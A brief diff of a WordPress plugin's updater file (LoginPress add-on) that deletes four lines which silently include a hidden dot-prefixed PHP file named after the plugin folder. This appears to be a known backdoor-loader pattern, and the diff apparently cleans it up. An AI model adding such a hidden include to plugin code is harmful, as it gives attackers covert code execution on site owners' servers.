@@ -1,9 +1,5 @@
 <?php
 //set_site_transient( 'update_plugins', null );
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class LoginPress_AddOn_Updater {
   private $api_url    = '';
   private $api_data   = array();
